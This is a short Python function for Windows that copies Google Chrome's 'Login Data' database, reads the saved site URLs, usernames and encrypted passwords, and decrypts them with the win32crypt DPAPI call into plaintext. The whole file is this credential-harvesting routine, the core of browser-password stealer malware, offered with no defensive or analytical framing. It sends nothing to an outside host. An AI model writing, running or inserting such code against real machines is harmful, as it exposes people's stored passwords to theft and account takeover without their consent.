import os
import shutil
import sqlite3
import win32crypt

def decrypt_chrome_passwords():
    # Copy the Chrome login data SQLite database to a temporary location
    login_db_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\Login Data")
    temp_db_path = os.path.join(os.getcwd(), 'chrome_login_data')
    shutil.copyfile(login_db_path, temp_db_path)

    # Connect to the database and execute a query to retrieve the encrypted credentials
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    credentials = cursor.fetchall()

    # Decrypt the password value using the win32crypt API
    decrypted_credentials = []
    for credential in credentials:
        decrypted_password = win32crypt.CryptUnprotectData(credential[2], None, None, None, 0)[1]
        decrypted_credential = (credential[0], credential[1], decrypted_password)
        decrypted_credentials.append(decrypted_credential)

    # Close the database connection and delete the temporary database file
    conn.close()
    os.remove(temp_db_path)

    # Return the retrieved credentials
    return decrypted_credentials
